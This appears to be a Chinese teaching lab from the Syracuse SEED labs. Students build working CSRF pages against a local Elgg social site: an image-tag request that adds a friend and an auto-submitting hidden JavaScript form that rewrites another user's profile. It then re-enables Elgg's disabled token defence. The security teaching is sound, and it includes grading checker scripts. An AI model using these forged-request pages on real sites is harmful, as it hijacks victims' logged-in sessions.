---
show: step
version: 1.0
enable_checker: true
---

# Elgg 系统 CSRF 攻击实验

## 一、实验介绍

**注意：进入实验需要等待一点时间才会出现界面，弹窗提示直接选择 `use default config` 按钮。** 

本次实验主要用于帮助学生理解跨站请求伪造（CSRF或XSRF）攻击。

CSRF攻击涉及用户受害者、受信任的网站和恶意网站。当受害者与受信任的站点拥有一个活跃的会话的同时，如果访问恶意网站，恶意网站会注入一个HTTP请求到受信任的站点，从而破话用户的信息。

## 二、实验背景

CSRF 攻击总是涉及到三个角色：信赖的网站（Collabtive）、受害者的 session 或 cookie 以及一个恶意网站。受害者会同时访问恶意网站与受信任的站点会话的时候。攻击包括一系列步骤，如下:

>1. 受害者用户使用他/她的用户名和密码登录到可信站点,从而创建一个新的会话。

>2. 受信任站点存储受害者会话的 cookie 或 session 在受害者用户的 web 浏览器端。

>3. 受害者用户在不退出信任网站时就去访问恶意网站。

>4. 恶意网站的网页发送一个请求到受害者的受信任的站点用户的浏览器。

>5. web 浏览器将自动连接会话 cookie，因为它是恶意的要求针对可信站点。

>6. 受信任的站点如果受到 CSRF 攻击，攻击者的一些恶意的请求会被攻击者发送给信任站点。

恶意网站可以建立HTTP GET或POST请求到受信任的站点。一些HTML标签,比如img iframe,框架,形式没有限制的URL,可以在他们的使用属性中。img,iframe,框架可用于构造GET请求。HTML表单标签可用于构造POST请求。构造GET请求是相对容易的,因为它甚至不需要JavaScript的帮助;构造POST请求需要JavaScript。因为Collabtive只针对后者,本实验的任务将只涉及HTTP POST请求。

## 三、预备知识：什么是CSRF 

[百度百科--CSRF](http://baike.baidu.com/link?url=h64nEfsH4Ok8FiOlsEcJuO8UUzbBSy9MeepkimruEVTv0wE7gM54P-0C1tTlUlylwqUXKxK0NBSP6eeyT_Qt7_)

CSRF(Cross-site request forgery)：中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF；

作用：攻击者盗用了你的身份，以你的名义发送恶意请求；

造成的危害包括：个人隐私泄露以及财产安全，以受害者的名义发送邮件、消息、盗取账号，甚至于购买商品，虚拟货币转账等。

## 四、环境搭建 
启动 mysql 服务器：
```
sudo mysqld_safe
```
启动服务：

```
sudo service apache2 start 
```
配置DNS解析：

```
sudo vim /etc/hosts
```

> 密码：dees	

>  vim文件编辑：(详细请大家学习Linux的课程)

> 按 i 进入编辑模式

> 按 Esc 退出编辑模式

> 使用 :wq 退出vim编辑器

在里面添加内容：

```
127.0.0.1       www.csrflabattacker.com
127.0.0.1       www.csrflabelgg.com
```

网站配置：

```
sudo vim /etc/apache2/conf.d/lab.conf	
```

```
<VirtualHost *:80>
ServerName www.csrflabattacker.com
DocumentRoot /var/www/CSRF/Attacker/
</VirtualHost>

<VirtualHost *:80>
ServerName www.csrflabelgg.com
DocumentRoot /var/www/CSRF/elgg/
</VirtualHost>
```

重启服务：
```	
sudo service apache2 restart
```

打开firefox浏览器，分别对 www.csrflabattacker.com 和 www.csrflabelgg.com 进行访问测试：

![4-1](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430185853381?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

![4-2](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430185873924?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

登陆账户：

    user	UserName	Password
    Admin	admin		seedelgg
    Alice	alice		seedalice
    Boby	boby		seedboby	
    Charlie	charlie		seedcharlie	
    Samy	samy		seedsamy

后文我们需要使用到 `live http headers` 工具，先安装一下。点击浏览器的 tools-》add-ons ，在搜索框输入 live http header 就可以找到，点击 install 即可安装，安装后重启浏览器就可以了。截图如下：

![4-3](https://doc.shiyanlou.com/document-uid600404labid936timestamp1525242614076.png/wm)

点击浏览器 tools-》 live http headers 可以打开这个抓包工具，打开过后再访问你要抓包的网站就可以在livehttpheaders 窗口看到抓取的信息了。

```checker
- name: check hosts
  script: |
    #!/bin/bash
    grep csrflabattacker /etc/hosts
    grep csrflabelgg /etc/hosts
  error: 没有配置/etc/hosts文件
- name: check lab.conf
  script: |
    #!/bin/bash
    ls /etc/apache2/conf.d/lab.conf
    grep Attacker /etc/apache2/conf.d/lab.conf
    grep elgg /etc/apache2/conf.d/lab.conf
  error: 没有lab.conf文件或者没有配置lab.conf文件
- name: check mysqld_safe
  script: |
    #!/bin/bash
    ps -ef |grep -v grep|grep mysqld_safe
  error: 没有启动mysqld_safe
- name: check apache2
  script: |
    #!/bin/bash
    ps -ef |grep -v grep|grep apache2
  error: 没有启动apache2
```

## 五、实验任务 

环境搭建好了，就可以开始我们的实验任务了。

### 5.1 添加好友 

两个用户，Alice与Boby。Boby想与Alice成为好友，但是Alice拒绝添加Boby；这时Boby需要发送一个URL给Alice，当Alice访问这个URL后，Boby就自动添加到好友列表中（注意Alice不用点击任何东西，只要访问URL就自动添加好友）。

首先我们要知道如何添加好友：

> 使用 admin seedelgg 进行登录，然后添加 boby 用户；

![5.1-1](https://dn-simplecloud.shiyanlou.com/uid/8797/1524817629266.png-wm)

![5.1-2](https://dn-simplecloud.shiyanlou.com/uid/8797/1524817743628.png-wm)

然后我们需要知道，添加用户时是使用的什么请求；使用 `LiveHttpHeader` 抓包：

>LiveHttpHeader 使用指南：

>    点击 Firefox 菜单栏中 Tools；

>	点击 LiveHttpHeader

>	勾选 Capture

>	点击 add friend

![5.1-3](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430186167643?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

分析抓取到的数据包：

![5.1-4](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430186206593?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

添加 boby 用户的链接,例如：

```
http://www.csrflabelgg.com/action/friends/add?friend=40&__elgg_ts=1524817660&__elgg_token=f581b9c0b6fab2aa1c5b5c64a7b4cf0c
```

这样我们就可以构造一个页面，让 Alice 用户访问以后，就会添加 boby 为好友。

```
sudo vim /var/www/CSRF/Attacker/hack.html
```

输入下面代码：

```
<html>
<img src="http://www.csrflabelgg.com/action/friends/add?friend=40&__elgg_ts=1524817660&__elgg_token=f581b9c0b6fab2aa1c5b5c64a7b4cf0c">
</html>
```
> 注意：这里的链接根据你实际获取到的链接填写

Alice 用户访问前：

![5.1-5](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430186343735?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
​	
Alice 用户访问：www.csrflabattacker.com/hack.html

![5.1-6](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430186371620?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

Alice 用户访问后：

![5.1-7](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430186395717?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

```checker
- name: check hack.html
  script: |
    #!/bin/bash
    file_name="/var/www/CSRF/Attacker/hack.html"
    ls $file_name
    grep friends $file_name
  error: hack.html不存在或者文件内容不对
```

### 5.2 修改用户信息 

Alice用户有一个自己的描述，她希望Boby也编辑自己的描述，但是Boby用户拒绝了，这时Alice想通过发送一个 url 让Boby用户访问后，让Boby自动添加自己的描述。

首先我们需要知道编辑自己的描述需要的请求,同样使用 `LiveHttpHeader` 抓包：

使用 alice seedalice 登录，点击左上角的头像；进入用户界面，点击 Edit Profile 可以编辑自己的描述；

>    打开Firefox菜单栏的Tools中的LiveHttpHeader
>    勾选Capture
>    编辑用户资料，点击save；

![5.2-1](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430186466149?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

![5.2-2](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430186502460?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

这里是抓取到的数据包：

```
POST /action/profile/edit HTTP/1.1
Host: www.csrflabelgg.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.csrflabelgg.com/profile/alice/edit
Cookie: Elgg=ks91qtcsis87selokqauqt96p1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 569
__elgg_token=17fb7abf0ec7666aae76d5b03372203f&__elgg_ts=1429842430&name=Alice&description=%3Cp%3Etest%3C%2Fp%3E&accesslevel%5Bdescription%5D=2&briefdescription=test&accesslevel%5Bbriefdescription%5D=2&location=test&accesslevel%5Blocation%5D=2&interests=test&accesslevel%5Binterests%5D=2&skills=test&accesslevel%5Bskills%5D=2&contactemail=test%40email.com&accesslevel%5Bcontactemail%5D=2&phone=123456&accesslevel%5Bphone%5D=2&mobile=123456&accesslevel%5Bmobile%5D=2&website=http%3A%2F%2Ftest.com&accesslevel%5Bwebsite%5D=2&twitter=test&accesslevel%5Btwitter%5D=2&guid=39
ST /action/profile/edit HTTP/1.1
Host: www.csrflabelgg.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.csrflabelgg.com/profile/alice/edit
Cookie: Elgg=ks91qtcsis87selokqauqt96p1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 569
__elgg_token=17fb7abf0ec7666aae76d5b03372203f&__elgg_ts=1429842430&name=Alice&description=%3Cp%3Etest%3C%2Fp%3E&accesslevel%5Bdescription%5D=2&briefdescription=test&accesslevel%5Bbriefdescription%5D=2&location=test&accesslevel%5Blocation%5D=2&interests=test&accesslevel%5Binterests%5D=2&skills=test&accesslevel%5Bskills%5D=2&contactemail=test%40email.com&accesslevel%5Bcontactemail%5D=2&phone=123456&accesslevel%5Bphone%5D=2&mobile=123456&accesslevel%5Bmobile%5D=2&website=http%3A%2F%2Ftest.com&accesslevel%5Bwebsite%5D=2&twitter=test&accesslevel%5Btwitter%5D=2&guid=39
```
通过分析我们可以得知编辑用户需要的请求，其中最重要的就是guid，用户的id标识符；于是Alice就写了如下代码并发送给Boby用户进行攻击.

```
sudo vim /var/www/CSRF/Attacker/csrf.html
```

这里是代码：

```
<html><body><h1>
This page forges an HTTP POST request.
</h1>
<script type="text/javascript">
function post(url,fields)
{
//create a <form> element.
var p = document.createElement("form");
//construct the form
p.action = url;
p.innerHTML = fields;
p.target = "_self";
p.method = "post";

        //append the form to the current page.
document.body.appendChild(p);
//submit the form
p.submit();
}
function csrf_hack()
{
var fields;
// The following are form entries that need to be filled out
// by attackers. The entries are made hidden, so the victim
// won't be able to see them.
fields += "<input type='hidden' name='name' value='Boby'>";
fields += "<input type='hidden' name='description' value='test'>";
fields += "<input type='hidden' name='accesslevel[description]' value='2'>";
fields += "<input type='hidden' name='briefdescription' value='test'>";
fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
fields += "<input type='hidden' name='location' value='test'>";
fields += "<input type='hidden' name='accesslevel[location]' value='2'>";
fields += "<input type='hidden' name='guid' value='40'>";
var url = "http://www.csrflabelgg.com/action/profile/edit";
post(url,fields);
}
// invoke csrf_hack() after the page is loaded.
window.onload = function() { csrf_hack();}
</script>
</body></html>
```

Boby用户访问前：

![5.2-3](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430186567992?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

Boby用户访问攻击url：www.csrflabattacker.com/csrf.html

![5.2-4](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430792231780?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

Boby用户访问后：

![5.2-5](https://dn-anything-about-doc.qbox.me/userid9094labid936time1430186621990?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

```checker
- name: check csrf.html
  script: |
    #!/bin/bash
    file_name="/var/www/CSRF/Attacker/csrf.html"
    ls $file_name
    grep csrf_hack $file_name
  error: csrf.html不存在或者文件内容不对
```

#### 思考 

问题1：Alice用户使用csrf攻击boby用户，需要知道Boby用户的guid，但是Alice没有Boby的密码，她可以通过什么办法来获取Boby用户的guid？

>    Alice可以先通过一个类似实验1这样的CSRF攻击来获取Boby用户的guid。

问题2：如果Alice想通过发送一个URL，不论是谁点击，谁就会受到CSRF攻击，受害者就会自动修改自己的资料，请解释一下要如何成功做到这样？

 >   首先，要使CSRF攻击成功的前提是必须拥有用户的guid，我们可以通过使用csrf来先获取用户的guid，然后自动提交到guid的位置，这样不论是谁，只要他没有退出elgg系统，同时访问了我们的攻击url就会自动编辑他们的资料；

### 5.3 Elgg系统的CSRF防御 

Elgg系统中有一个针对CSRF内置的防御机制，上面的实验，我们注释了防御机制来攻击的！

针对CSRF的防御并不难，这里有几个常见的方法：

> 加密令牌：web应用程序可以在网页中嵌入一个加密的令牌，所有的请求都包含这个加密令牌，由于跨站请求无法获取这个令牌，所以伪造的请求很容易就被服务器识别；

>	Referer头途径：使用web应用程序也可以验证请求来源页面的Referer，然后由于隐私考虑，这个referer经常被客户端过滤；

Elgg系统就是使用 加密令牌 机制保护系统；它嵌入两个参数 `__elgg_ts` 和 `__elgg_token`，这个我们在之前的 `LiveHttpHeader` 抓包中可以看到；

对于所有用户操作，都有如下的代码来保护用户要执行的操作：

```
<input type = "hidden" name = "__elgg_ts" value = "" />
<input type = "hidden" name = "__elgg_token" value = "" />
```

下面的代码显示如何将上面的保护代码动态添加到web页面：
```
sudo vim /var/www/CSRF/elgg/views/default/input/securitytoken.php
```
这里是代码：

```
<?php
/**
* CSRF security token view for use with secure forms.
 *
 * It is still recommended that you use input/form.
 *
 * @package Elgg
 * @subpackage Core
 */

$ts = time();
$token = generate_action_token($ts);

echo elgg_view('input/hidden', array('name' => '__elgg_token', 'value' => $token));
echo elgg_view('input/hidden', array('name' => '__elgg_ts', 'value' => $ts));
```
上面的防御其实并不够，我们还可以通过给加密参数，时间戳，用户sessionID加上HASH函数；在elgg系统中就有这样的机制。

> hash函数：一般翻译做"散列"，也有直接音译为"哈希"的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，而不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。

#### 1.我们来看加密令牌的生成：

```
function generate_action_token($timestamp)
{
        $site_secret = get_site_secret();
        $session_id = session_id();
        // Session token
        $st = $_SESSION[’__elgg_session’];
        if (($site_secret) && ($session_id))
        {
                return md5($site_secret . $timestamp . $session_id . $st);
        }
        return FALSE;
}
```

#### 2.会话sessionID的随机值产生：

```
.........
........
// Generate a simple token (private from potentially public session id)
if (!isset($_SESSION[’__elgg_session’])) {
        $_SESSION[’__elgg_session’] = ElggCrypto::getRandomString(32,ElggCrypto::CHARS_HEX);
........
........
```

#### 3.加密令牌的验证

elgg应用程序验证生成的令牌和时间戳来抵御CSRF攻击，每一个用户都有一个验证机制，如果令牌不存在或失效，用户操作将被拒绝并被重定向。下面是验证机制代码：

```
function validate_action_token($visibleerrors = TRUE, $token = NULL, $ts = NULL)
{
if (!$token) { $token = get_input(’__elgg_token’); }
if (!$ts) {$ts = get_input(’__elgg_ts’); }
$session_id = session_id();
if (($token) && ($ts) && ($session_id)) {
        // generate token, check with input and forward if invalid
        $required_token = generate_action_token($ts);

        // Validate token
        if ($token == $required_token) {

                        if (_elgg_validate_token_timestamp($ts)) {
                        // We have already got this far, so unless anything
                        // else says something to the contrary we assume we’re ok
                $returnval = true;
                ........
                ........
                }
                Else {
                ........
                ........
                register_error(elgg_echo(’actiongatekeeper:tokeninvalid’));
        ........
        ........
}
........
........
}
```

#### 4.打开elgg系统的防御策略：

```
sudo vim /var/www/CSRF/elgg/engine/lib/actions.php
```

在307行，原始代码：

```
function action_gatekeeper($action) {

        //SEED:Modified to enable CSRF.
        //Comment the below return true statement to enable countermeasure.
        return true;

        if ($action === 'login') {
                if (validate_action_token(false)) {
                        return true;
                }

                $token = get_input('__elgg_token');
                $ts = (int)get_input('__elgg_ts');
                if ($token && _elgg_validate_token_timestamp($ts)) {
                        // The tokens are present and the time looks valid: this is probably a mismatch due to the
                        // login form being on a different domain.
                        register_error(elgg_echo('actiongatekeeper:crosssitelogin'));


                        forward('login', 'csrf');
                }
                // let the validator send an appropriate msg
                validate_action_token();

        } elseif (validate_action_token()) {
                return true;
        }

        forward(REFERER, 'csrf');
}
```

注释掉 return true：

```
function action_gatekeeper($action) {

        //SEED:Modified to enable CSRF.
        //Comment the below return true statement to enable countermeasure.
        #return true;

        if ($action === 'login') {
                if (validate_action_token(false)) {
                        return true;
                }

                $token = get_input('__elgg_token');
                $ts = (int)get_input('__elgg_ts');
                if ($token && _elgg_validate_token_timestamp($ts)) {
                        // The tokens are present and the time looks valid: this is probably a mismatch due to the
                        // login form being on a different domain.
                        register_error(elgg_echo('actiongatekeeper:crosssitelogin'));


                        forward('login', 'csrf');
                }
                // let the validator send an appropriate msg
                validate_action_token();

        } elseif (validate_action_token()) {
                return true;
        }

        forward(REFERER, 'csrf');
}
```

接着再次尝试CSRF攻击将失效！

```checker
- name: check securitytoken.php
  script: |
    #!/bin/bash
    file_name="/var/www/CSRF/elgg/views/default/input/securitytoken.php"
    ls $file_name
    grep "elgg_view" $file_name
  error: securitytoken.php 不存在或者文件内容不对 
- name: check actions.php
  script: |
    #!/bin/bash
    sed -n "311p" /var/www/CSRF/elgg/engine/lib/actions.php|grep "#"
  error: actions.php 没有修改
```

## 六、作业 

你需要提交一份详细的实验报告来描述你做了什么和你所学到的。

请提供使用LiveHTTPHeaders的使用细节或屏幕截图。

您还需要提供有趣的或令人惊讶的解释。

## license 

本实验所涉及的实验环境来自[Syracuse SEED labs](http://www.cis.syr.edu/~wedu/seed/)，并在此基础上为适配实验楼的工作环境进行修改，修改后的实验文档仍然遵循GUN Free Documentation License

附[Syracuse SEED labs](http://www.cis.syr.edu/~wedu/seed/)版权说明：

Copyright 

 c 2006 - 2011 Wenliang Du, Syracuse University.
The development of this document is/was funded by three grants from the US National Science Foundation:
Awards No. 0231122 and 0618680 from TUES/CCLI and Award No. 1017771 from Trustworthy Computing.
Permission is granted to copy, distribute and/or modify this document under the terms of the GNU Free
Documentation License, Version 1.2 or any later version published by the Free Software Foundation. A copy
of the license can be found at http://www.gnu.org/licenses/fdl.html.





